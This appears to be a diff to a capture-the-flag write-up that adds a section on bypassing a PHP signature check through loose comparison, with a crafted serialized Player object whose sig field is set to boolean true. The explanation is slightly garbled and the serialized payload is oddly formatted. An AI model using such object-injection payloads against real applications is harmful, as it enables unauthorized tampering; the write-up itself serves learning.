@@ -92,6 +92,18 @@ I assumed that the secret may be able to be cracked using a rainbow table. Since
 The secret was not cracked. So we have to move to another method.
 
 **Exploit the Loose Comparison**
+The `if` condition `if($this->sig == md5($secret . $this->weapon))` uses a loose comparison between `$this->sig`. In PHP, the loose comparison == between **boolean** value `1` and a string always returns `TRUE`. Which means I can bypass this condition my modify the signature of the malicious `Player` object to hold the boolean value `1`.
+
+```php
+O:6:"Player":5 {
+	s:6:"health";i:100;
+	s:6:"attack";
+	i:10;s:5:"coins";
+	i:0;s:6:"weapon";
+	s:12:"Golden Sword";
+	s:3:"sig";b:1;
+}
+```
 
 ---
 
@@ -105,7 +117,3 @@ The secret was not cracked. So we have to move to another method.
     
     - `user:password`
         
-
----
-
-**References:** [Link](https://www.google.com/search?q=url)
